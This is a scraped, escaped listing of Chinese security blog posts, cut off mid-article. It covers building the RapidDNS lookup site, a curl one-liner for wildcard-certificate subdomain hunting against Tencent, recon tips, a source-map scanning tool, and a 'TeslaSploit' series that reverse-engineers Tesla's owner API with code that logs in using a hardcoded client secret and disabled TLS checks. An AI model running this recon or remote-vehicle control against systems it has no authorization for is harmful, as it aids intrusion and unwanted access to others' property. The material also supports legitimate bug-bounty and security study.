&lt;pre&gt;&lt;code&gt;{
  &amp;quot;mappings&amp;quot;: {
    &amp;quot;domain&amp;quot;: {
      &amp;quot;properties&amp;quot;: {
        &amp;quot;name&amp;quot;: {
          &amp;quot;type&amp;quot;: &amp;quot;text&amp;quot;

        },
        &amp;quot;type&amp;quot;: {
          &amp;quot;type&amp;quot;: &amp;quot;keyword&amp;quot;

        },
        &amp;quot;value&amp;quot;: {
          &amp;quot;type&amp;quot;: &amp;quot;ip&amp;quot;

        },
        &amp;quot;domain&amp;quot;: {
          &amp;quot;type&amp;quot;: &amp;quot;keyword&amp;quot;

        }
      }
    }
  }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;最关键的其实是导入程序，也是投入时间最多的，因为数据量比较多。单纯使用bulk速度很慢。使用SSD速度会提高几倍。但是依然达不到预期，因为会出现es内存耗尽，队列太多等各种异常，比如导入到8亿多数据时报错。也尝试通过迭代的方式来实现高性能文件读取，但是最后主要的根源还是在es和字符串的处理上。最后采用多进程方式。elasticsearch设置不刷新，0副本，并调整es的queue，线程，最大内存等参数。这个需要根据自己机器配置去进行调整。通过实际使用一天导入大概10亿条记录，当然还是有优化空间的。&lt;/p&gt;
&lt;p&gt;修改index设置的方法：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;{
  &amp;quot;index&amp;quot;: {
    &amp;quot;refresh_interval&amp;quot;: -1,
    &amp;quot;number_of_replicas&amp;quot;: 0
  }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;导入完成后在修改回去即可。&lt;/p&gt;
&lt;p&gt;以上elasticsearch使用的是6.7.1版本。其他版本可能会有差异，根据实际情况调整即可。&lt;/p&gt;
&lt;h2 id=&#34;总结&#34;&gt;总结&lt;/h2&gt;
&lt;p&gt;其实总体来说，本文技术上没啥复杂度，实现起来也相对简单。我觉得有点像以前革命时期八路军的风格（完了往自己脸上贴金了，勿喷），在有限的条件下来尽可能实现自己想要的效果。&lt;/p&gt;
&lt;p&gt;希望本文对你有所帮助，对于上述内容有任何疑问，可以给我发送消息一起交流。&lt;/p&gt;
&lt;p&gt;最后，RapidDNS已经一周年，这一年家人和同事的支持，同学的帮助，以及国内外朋友的称赞和鼓励，才让我坚持维护着网站运行。感谢在网站运行中大家提来的建议和反馈！感谢所有使用RapidDNS的人！感谢你们让RapidDNS更好。&lt;br&gt;
所以，RapidDNS现有查询功能将一直免费开放下去，同时新的一年我也会增加新的功能，也欢迎大家发来你们的建议和想法。&lt;/p&gt;
&lt;p&gt;大家也可以关注公众账号，获取最新的网站功能、使用技巧等内容。&lt;/p&gt;
&lt;center&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1615992545149.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;/center&gt;
&lt;!-- more --&gt;
&lt;center&gt;The End&lt;/center&gt;">我是如何低成本建立RapidDNS.io网站的</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/RapidDNS-02/"" data-c="
          &lt;p&gt;大家好，我是BaCde。今天给大家分享一下我这个月提交鹅厂漏洞的一个挖掘思路。&lt;/p&gt;
&lt;p&gt;首先说一下结果，一个SQL注入（可报错回显）、弱口令（审核后发现是域名解析IP错误）和一个有限的SSRF漏洞。&lt;/p&gt;
&lt;p&gt;当然今天我要说的不是直接查询子域名，那就没必要写这篇文章了。&lt;/p&gt;
&lt;p&gt;像鹅厂这样规模的企业，其资产数量众多。同样的，其盯着他的大佬们也非常多。而目前收集信息的方法大多数都差不多。本身厂商自己也会对其进行监控、检测。基本上很多被筛选了很多遍。那应该如何去挖掘呢？其中一种思路就是找到别人未发现的一些资产，这将增加挖掘的概率。&lt;/p&gt;
&lt;p&gt;RapidDNS网站在2020年12月的时候增加了5000万的HTTPS证书数据。暂时还没有对证书查询独立（将在新上线的版本独立查询）。&lt;/p&gt;
&lt;!-- more --&gt;
&lt;p&gt;相信大家在测试的时候一定会发现一些目标的SSL证书中Subject的CommonName有*.qq.com这样的情况，有的域名可能为二级或三级，甚至更多。这样的域名大多数意味着下级有子域名。通过对其进行爆破，则可能发现一些之前未发现的资产。&lt;/p&gt;
&lt;p&gt;首先，大家可以通过RapidDNS查询子域名，然后导出csv，对其进行筛选。当然也可以使用一行命令来解决。&lt;/p&gt;
&lt;p&gt;将下面命令中$1换成对应目标即可，如果没结果，可以多请求几次试试。&lt;/p&gt;
&lt;p&gt;curl -s &amp;quot;https://rapiddns.io/subdomain/$1?full=1&amp;quot; | grep -oP &#39;_blank&amp;quot;&amp;gt;\K[^&amp;lt;]*&#39; | grep * |sort -u&lt;/p&gt;
&lt;p&gt;查询结果如下：&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1615992464027.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;把*.去掉，然后批量去爆破子域名。将跑出来的域名在去进行探测挖掘即可，我使用xray成功扫描到其SQL注入漏洞。当然这里的扫描工具就很多了，看各位大佬的习惯了。&lt;/p&gt;
&lt;p&gt;今天的内容就是这么简单，也有一定运气成分。只是提出一种我使用的有效的思路。祝大家好运！！！&lt;/p&gt;
&lt;p&gt;扫描下方二维码可关注公众号&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1615992545149.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;center&gt;The End&lt;/center&gt;">RapidDNS网站在SRC漏洞挖掘中的一个思路</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/rapiddnsio-tips/"" data-c="
          &lt;p&gt;大家好，我是BaCde。公众号开通了2个月，一直没发内容。本来计划写写网站建设思路，今天先写一篇网站的使用分享。&lt;/p&gt;
&lt;p&gt;网站自发布以来，一直没有什么说明和教程。因为它的功能非常单一，不需要做太多介绍。但是呢，有一些小细节和场景，我觉得可以分享下。&lt;/p&gt;
&lt;p&gt;首先，网站基础功能可以查询网站子域名，根据IP地址或IP段查询绑定的域名信息，这里支持IPv6的地址和地址段。目前最大支持显示1万条（大多数情况下足够了）。其中查询结果页面中有导出csv的功能，可以导出全部结果。其实不导出，查询全部结果只需要加入参数?full=1即可。目前大多数开源工具采集时采用也是这样的方式。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1615429646070.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;下面来说下实际应用场景。&lt;/p&gt;
&lt;h2 id=&#34;信息收集&#34;&gt;信息收集&lt;/h2&gt;
&lt;p&gt;在收集ASN信息时，可以根据反向IP段查询，迅速确定筛选出目标的资产。&lt;/p&gt;
&lt;p&gt;比如下图中搜索到的腾讯结果中，有很多ip段时属于腾讯云服务的机器，这些IP对我们挖掘漏洞来说，意义不大。但是可能又会存在夹杂在其中的个别目标。这时候就可以使用Reverse IP功能进行查询，然后筛选出目标或者筛选IP段。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1615429652715.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;下面随便挑了一个（58.87.64.0/18）查询结果来展示下，发现大多数不是腾讯的域名，则可以跳过，或者从中筛选出腾讯的。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1615429659028.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;溯源定位&#34;&gt;溯源定位&lt;/h2&gt;
&lt;p&gt;这里主要说两个场景，第一个就是扫到某个IP存在漏洞，想知道哪个厂商的，第二个就是对于攻击IP地址是属于哪个机构的。这是两个非常常见的需求。&lt;/p&gt;
&lt;p&gt;这里一种方法是直接查询IP地址，那么，当ip地址查不到时怎么办呢？&lt;/p&gt;
&lt;p&gt;今天就在微信群里遇到一个例子。有人在日志中发现了360某团队的一个dnslog的地址，但是打开其域名时一个空白地址。这里我通过获取到解析的IP地址，查询C段，然后很快速的发现了dnslog平台的登录地址，根据版权信息确认是360的。&lt;/p&gt;
&lt;p&gt;其发现的地址形如：xxx.b.nslog.0kee.360.cn。访问nslog.0kee.360.cn为空白，其解析的IP地址为123.59.211.124。通过RapidDNS来查询C段，查询链接：https://rapiddns.io/sameip/123.59.211.124/24#result。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1615429676971.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;在结果中可以发现一个0kdns.net的域名，访问后就是dnslog平台登录地址。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1615429683321.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;好了，以上就是我经常使用到的方法，跟大家分享出来。另外，网站由于网络原因，可能会不太稳定。有问题大家可即时反馈，看到后我会第一时间来解决。&lt;/p&gt;
&lt;p&gt;扫描篇下方二维码可关注公众号&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;6&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1615429807479.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;!-- more --&gt;
&lt;p&gt;The END&lt;/p&gt;
">RapidDNS.IO 网站应用实例</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/sourcemapx/"" data-c="
          &lt;p&gt;SourceMapX是一个批量扫描并恢复sourcemap的源代码文件的脚本。&lt;/p&gt;
&lt;p&gt;项目地址:&lt;br&gt;
&lt;a href=&#34;https://github.com/insightglacier/SourceMapX&#34;&gt;https://github.com/insightglacier/SourceMapX&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;安装&#34;&gt;安装&lt;/h2&gt;
&lt;p&gt;该脚本主要由&lt;a href=&#34;https://github.com/rarecoil/unwebpack-sourcemap&#34;&gt;unwebpack-sourcemap&lt;/a&gt;项目修改而来，使用Python3编写,需要安装 &lt;code&gt;BeautifulSoup4&lt;/code&gt; and &lt;code&gt;requests&lt;/code&gt;.可以使用 &lt;code&gt;pip3 install -r requirements.txt&lt;/code&gt;命令进行安装。主要是修改为批量检测并下载，可用于SRC的漏洞挖掘。&lt;/p&gt;
&lt;!-- more --&gt;
&lt;h2 id=&#34;使用&#34;&gt;使用&lt;/h2&gt;
&lt;p&gt;命令参数：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;usage: SourceMapX.py [-h] [-m METHOD] [-d] [-o OUTPUT] uri_or_file

A tool to extract code from Webpack sourcemaps. Turns black boxes into gray ones.

positional arguments:
  uri_or_file           The target URI or file.

optional arguments:
  -h, --help            show this help message and exit
  -m METHOD, --method METHOD
                        L:Local, R:Remote
  -d, --detect          Attempt to detect sourcemaps from JS assets in retrieved HTML.
  -o OUTPUT, --output OUTPUT
                        Make the output directory if it doesn&#39;t exist.

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;其中-m有R和L，R为Remote（远程），L为Local（本地）。&lt;/p&gt;
&lt;p&gt;-o 为结果文件保存的路径。默认为output。&lt;/p&gt;
&lt;p&gt;将要扫描的url存放到文件中（需要带http或https），如urls.txt，然后运行如下命令。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;python SourceMapX.py -m R -d urls.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;对于探测到的.map文件会url地址会保存到&lt;code&gt;results.txt&lt;/code&gt;文件中。&lt;/p&gt;
&lt;p&gt;程序还不够完善，后续看情况是否更新吧。&lt;/p&gt;
&lt;h2 id=&#34;致谢&#34;&gt;致谢&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/rarecoil/unwebpack-sourcemap&#34;&gt;unwebpack-sourcemap&lt;/a&gt; @rarecoil&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注：请不要将该脚本用于非法用途，仅用于合法的，经过授权的渗透测试，公司内部安全检查与研究使用。由于使用工具带来的不良后果与本人无关。&lt;/strong&gt;&lt;/p&gt;
">SourceMapX——批量扫描并恢复sourcemap的源代码文件</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/hacking-all-the-cars-tesla-api-exploit-part-two/"" data-c="
          &lt;p&gt;该系列文章将通过逆向的方式分析Tesla远程api，并自己编写代码实现远程控制Tesla汽车。该篇文章为第二篇，将主要讲解websocket抓包分析与编程实现对Tesla的远程控制。如果你还没看第一篇，请先查看第一篇内容&lt;a href=&#34;https://bacde.me/post/hacking-all-the-cars-tesla-api-exploit-part-one/&#34;&gt;Hacking All The Cars - Tesla 远程API分析与利用（上）&lt;/a&gt;。&lt;/p&gt;
&lt;h2 id=&#34;0x00-websocket通信分析&#34;&gt;0x00 Websocket通信分析&lt;/h2&gt;
&lt;p&gt;Tesla的召唤功能除自动召唤外，还支持手动的前进与后退功能。要想手机APP可以使用召唤功能，需要先在车机中开启召唤功能。&lt;/p&gt;
&lt;p&gt;在测试时，建议寻找一块比较大的空地，然后设置抓包，使用手机APP进行操作。通过burpsuite抓到的数据包可知，召唤功能主要通过websocket来实现。但是分析过程中可以发现，burpsuite只显示了连接地址和发送的数据内容，并没有显示其请求的头，所以，当直接去连接时会返回401错误。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1605326984308.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;img src=&#34;/Users/aliceclaudia/work/Blog/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6tesla%E5%AE%9E%E7%8E%B0/%E4%B8%8B/images/ppt/04_tesla_websockets.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;在这个时候就需要还一个工具了，本文选择使用charles。这个工具针对websocket的支持非常友好，不仅可以看到请求头，还针对发送与接收以不同的颜色区分显示出来，十分方便分析。&lt;/p&gt;
&lt;!-- more --&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1605326993757.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;img src=&#34;/Users/aliceclaudia/work/Blog/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6tesla%E5%AE%9E%E7%8E%B0/%E4%B8%8B/images/ppt/charles.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1605326998120.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;img src=&#34;/Users/aliceclaudia/work/Blog/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6tesla%E5%AE%9E%E7%8E%B0/%E4%B8%8B/images/ppt/charles2.png&#34; alt=&#34;charles2&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;对于抓包环境的设置，这里说一下，因为Tesla是tls+websocket实现，所以我们抓包时需要替换为自己的证书。安卓和ios设置方法存在差异，不过Tesla并不需要sslpin bypass。添加自己的受信任的证书即可。由于我在测试时，安卓机gps有问题，所以我换了iphone，并通过设置sock5类型代理来实现抓包。这些都是抓包常规操作，这里只是提一下，不知道如何设置的朋友自己去搜索一下吧，这里不做赘述。&lt;/p&gt;
&lt;p&gt;为了更好的分析，建议多抓几次前进或者后退的包，便于进行对比。通过对websocket的通信数据分析，请求的数据通信格式为json，每条数据都有时间戳，还有&lt;code&gt;msg_type&lt;/code&gt;字段，经过去重统计，一共有7种&lt;code&gt;msg_type&lt;/code&gt;，分别有&lt;code&gt;control:ping&lt;/code&gt;、&lt;code&gt;autopark:info&lt;/code&gt;、&lt;code&gt;autopark:device_location&lt;/code&gt;、&lt;code&gt;autopark:cmd_forward&lt;/code&gt;、&lt;code&gt;autopark:cmd_reverse&lt;/code&gt;、&lt;code&gt;autopark:heartbeat_app&lt;/code&gt;、&lt;code&gt;autopark:cmd_abort&lt;/code&gt;。其中&lt;code&gt;autopark:device_location&lt;/code&gt;又有两种&lt;code&gt;summon_type&lt;/code&gt;,分别为 &lt;code&gt;find_me&lt;/code&gt;、&lt;code&gt;pin_drop&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;分析多次抓包的结果，确定如下流程：&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://p1.ssl.qhimg.com/t0151d84160f0365327.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;以上流程除&lt;code&gt;autopark:cmd_abort&lt;/code&gt;外缺少一个过程都将会导致召唤失败。当然，实际过程中还会有其他数据包，但是不发送也可以成功召唤。&lt;/p&gt;
&lt;h2 id=&#34;0x01-系统整体设计&#34;&gt;0x01 系统整体设计&lt;/h2&gt;
&lt;p&gt;我将程序的名字命名为TeslaSploit Framework。代码实现以Python3实现。使用协程来完成网络请求，使用的库为aiohttp和websockets。对于程序界面还是选择了交互式控制台的方式，操作和风格与metasploit框架类似。专业叫法为REPL（交互式解释器），即 Read(读取)，Evaluate（执行），Print（打印），Loop（循环）。这里为了快速实现，选择了sploitkit这个库。&lt;/p&gt;
&lt;p&gt;程序界面如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1605327033774.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;img src=&#34;/Users/aliceclaudia/work/Blog/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6tesla%E5%AE%9E%E7%8E%B0/%E4%B8%8B/images/ppt/teslasploit01.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;目录结构则分为data目录，teslasploit目录，入口文件为程序根目录下main.py。data目录下分别放了config文件夹和token，前者存放账号密码，后者存放登录成功后的token等配置信息。teslasploit目录下又lib、banners、modules，分别存在库文件、bannner和利用模块。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1605327061782.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;![](/Users/aliceclaudia/work/Blog/远程控制tesla实现/下/images/ppt/截屏2020-10-21 下午12.06.03.png)&lt;/p&gt;
&lt;p&gt;操作的命令主要以下几个&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;show modules
use exploit/tesla/*
run
back
exit
set [key] [value]
show options
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;对于本次的需求，这些已经足够。&lt;/p&gt;
&lt;h2 id=&#34;0x02-编程实现&#34;&gt;0x02 编程实现&lt;/h2&gt;
&lt;p&gt;该代码仅在macos系统，python3.8.2的系统环境下运行，其他系统未进行测试。&lt;/p&gt;
&lt;h3 id=&#34;控制台&#34;&gt;控制台&lt;/h3&gt;
&lt;p&gt;安装sploitkit库，&lt;code&gt;pip install sploitkit&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;新建main.py文件，写入如下代码&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#!/usr/bin/python3
&amp;quot;&amp;quot;&amp;quot;
Copyright (c) 2020 Ingeek Tiger-team (https://ingeek.com/)
&amp;quot;&amp;quot;&amp;quot;

from __future__ import print_function

try:
    import sys
    sys.dont_write_bytecode = True

    from teslasploit.lib import TeslasploitConsole

except KeyboardInterrupt:
    sys.exit(&amp;quot;&amp;quot;)

if __name__ == &#39;__main__&#39;:
    TeslasploitConsole(&amp;quot;tesla&amp;quot;).start()

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在teslasploit/lib/ 文件夹下创建&lt;code&gt;__init__.py&lt;/code&gt; 文件，写入如下代码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#!/usr/bin/python3
import re
from sploitkit import FrameworkConsole


class TeslasploitConsole(FrameworkConsole):
    sources = {
        &#39;banners&#39;:   &amp;quot;./teslasploit/banners&amp;quot;,
        &#39;entities&#39;:  [&amp;quot;./teslasploit/modules&amp;quot;],
        &#39;libraries&#39;: &amp;quot;./teslasploit&amp;quot;,
    }
    
    def __init__(self, *args, **kwargs):
        super(TeslasploitConsole, self).__init__(*args, **kwargs)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这样，程序的控制台界面就可以运行了。可以输入&lt;code&gt;python3 main.py&lt;/code&gt; 看看效果了。以上两段代码直接参考&lt;a href=&#34;https://github.com/dhondta/python-sploitkit&#34;&gt;https://github.com/dhondta/python-sploitkit&lt;/a&gt; 这里的例子。&lt;/p&gt;
&lt;p&gt;为了程序界面更加酷炫一些，可以增加ascii字形或ascii图形。python有第三方库可以用。当然网络上也有在线转换的工具。这里选择使用python的asciistuff库。&lt;/p&gt;
&lt;p&gt;使用如下两行代码，可随机风格的ascii字形：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from asciistuff import Banner
print(Banner(&amp;quot;Test&amp;quot;))
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1605327095611.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;img src=&#34;/Users/aliceclaudia/work/Blog/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6tesla%E5%AE%9E%E7%8E%B0/%E4%B8%8B/images/asciistuff_01.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;如果想生成固定的图形，则可以查看&lt;a href=&#34;https://github.com/dhondta/python-asciistuff/blob/master/asciistuff/fonts.txt&#34;&gt;https://github.com/dhondta/python-asciistuff/blob/master/asciistuff/fonts.txt&lt;/a&gt;。详细用法自行查看&lt;a href=&#34;https://github.com/dhondta/python-asciistuff&#34;&gt;https://github.com/dhondta/python-asciistuff&lt;/a&gt;。这里还有另外一个库，&lt;a href=&#34;https://github.com/jeffbuttars/cowpy&#34;&gt;cowpy&lt;/a&gt;，是cow say风格的图形，可根据自己喜好选择是否使用。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1605327086469.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;img src=&#34;/Users/aliceclaudia/work/Blog/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6tesla%E5%AE%9E%E7%8E%B0/%E4%B8%8B/images/cowpy.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;汽车类编写&#34;&gt;汽车类编写&lt;/h3&gt;
&lt;p&gt;控制台界面已经有了，先来创建一个名为CarBase的类，后面每台车都基于该类创建一个车辆对象，便于进行批量控制。这里的网络通信主要是用&lt;code&gt;aiohttp&lt;/code&gt;和&lt;code&gt;websockets&lt;/code&gt;两个库来完成。直接使用pip 安装即可。&lt;/p&gt;
&lt;p&gt;该类主要包括登录、api请求、获取车辆列表、车辆详细信息、控制（开锁、锁车、空调、温度等）、召唤功能。&lt;/p&gt;
&lt;p&gt;以上功能请求需要用到4个常量，声明如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;TESLA_CLIENT_ID =&amp;quot;81527cff06843c8634fdc09e8ac0abefb46ac849f38fe1e431c2ef2106796384&amp;quot;
TESLA_CLIENT_SECRET =&amp;quot;c7257eb71a564034f9419ee651c7d0e5f7aa6bfbd18bafb5c5c033b093bb2fa3&amp;quot;
TESLA_BASE_URL =&amp;quot;https://owner-api.teslamotors.com/&amp;quot;
TESLA_BASE_WS =&amp;quot;streaming.vn.teslamotors.com&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;具体功能定义如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1605327104917.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;img src=&#34;/Users/aliceclaudia/work/Blog/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6tesla%E5%AE%9E%E7%8E%B0/%E4%B8%8B/images/functions.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;登录&#34;&gt;登录&lt;/h4&gt;
&lt;p&gt;对于aiohttp的基础使用，建议大家去了解一下开发文档。其用法与requests库类似，很容易上手。先以登录来举例子，该代码就是post请求&lt;code&gt;oauth/token?grant_type=password&lt;/code&gt; 登录，登录成功会返回token信息。代码如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;async def login(self):
    data={
        &amp;quot;grant_type&amp;quot;: &amp;quot;password&amp;quot;,
        &amp;quot;client_id&amp;quot;: TESLA_CLIENT_ID,
        &amp;quot;client_secret&amp;quot;: TESLA_CLIENT_SECRET,
        &amp;quot;email&amp;quot;: self.email,
        &amp;quot;password&amp;quot;: self.password,
    }
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
        async with session.post(TESLA_BASE_URL+&amp;quot;oauth/token?grant_type=password&amp;quot;, data=data) as resp:
            if resp.status == 200:
                text = await resp.text()
                self.token = json.loads(text)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1605327114461.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;img src=&#34;/Users/aliceclaudia/work/Blog/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6tesla%E5%AE%9E%E7%8E%B0/%E4%B8%8B/images/login.png&#34; alt=&#34;login&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;获取车辆信息&#34;&gt;获取车辆信息&lt;/h4&gt;
&lt;p&gt;首先要获取车辆列表，请求地址为&lt;code&gt;/api/1/vehicles&lt;/code&gt;,请求方式为GET。发送后，根据返回的json内容提取id、display_name、vin字段的值。根据id可以获取车辆详细信息。获取车辆详细信息之前还需要发送&lt;code&gt;/api/1/vehicles/{id}/wake_up&lt;/code&gt;(替换{id}为实际id即可)请求，不然车辆如果在没被唤醒状态下会返回错误。&lt;/p&gt;
&lt;p&gt;车辆详细信息的请求路径为&lt;code&gt;/api/1/vehicles/{id}/vehicle_data&lt;/code&gt;(替换{id}为实际id即可)。在发送请求时都加上&lt;code&gt;Authorization&lt;/code&gt;请求头。获取成功信息以json格式返回，其中包含了很多信息，这里只需要提取vin、display_name、gps、电量、续航、车内温度、车外温度。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;User-Agent: TeslaSploit
Authorization: Bearer [access_token]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;返回的信息为了便于在控制台下显示，采用了&lt;code&gt;terminaltables&lt;/code&gt;这个库来。显示格式如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1605327121111.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;img src=&#34;/Users/aliceclaudia/work/Blog/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6tesla%E5%AE%9E%E7%8E%B0/%E4%B8%8B/images/ascii_table.png&#34; alt=&#34;ascii_table&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;对应的代码部分如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;carinfo = self.carinfo[&amp;quot;response&amp;quot;]
                            
if carinfo[&amp;quot;state&amp;quot;]==&amp;quot;online&amp;quot;:
    state = &amp;quot;在线&amp;quot;
else:
    state = &amp;quot;离线&amp;quot;
print(&amp;quot;\n%s (%s)\n&amp;quot; % (carinfo[&amp;quot;display_name&amp;quot;], state))

gps = &amp;quot;%s, %s&amp;quot; % (carinfo[&amp;quot;drive_state&amp;quot;][&amp;quot;latitude&amp;quot;],carinfo[&amp;quot;drive_state&amp;quot;][&amp;quot;longitude&amp;quot;])
battery_level = str(carinfo[&amp;quot;charge_state&amp;quot;][&amp;quot;battery_level&amp;quot;])+&amp;quot;%&amp;quot;
battery_range = str(carinfo[&amp;quot;charge_state&amp;quot;][&amp;quot;battery_range&amp;quot;])+&amp;quot;英里&amp;quot;
inside_temp = carinfo[&amp;quot;climate_state&amp;quot;][&amp;quot;inside_temp&amp;quot;]
outside_temp = carinfo[&amp;quot;climate_state&amp;quot;][&amp;quot;outside_temp&amp;quot;]
vin = carinfo[&amp;quot;vin&amp;quot;]        

car_table = [
    [&amp;quot;vin&amp;quot;,vin,&amp;quot;电量&amp;quot;,battery_level,&amp;quot;电池续航&amp;quot;,battery_range],
    [&amp;quot;GPS&amp;quot;,gps,&amp;quot;车外温度&amp;quot;,outside_temp,&amp;quot;车内温度&amp;quot;,inside_temp],
]
self.print_table(car_table)
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;控制&#34;&gt;控制&lt;/h4&gt;
&lt;p&gt;经过分析，诸如开锁、锁门、开/关空调、设置温度、开启后备箱等请求格式均相似，可以统一使用一个方法来实现。其url地址格式为&lt;code&gt;/api/1/vehicles/{id}/command/{command}&lt;/code&gt;,请求方法为POST，请求数据格式为json格式，如果没有参数可以使用&lt;code&gt;{}&lt;/code&gt;来表示。&lt;/p&gt;
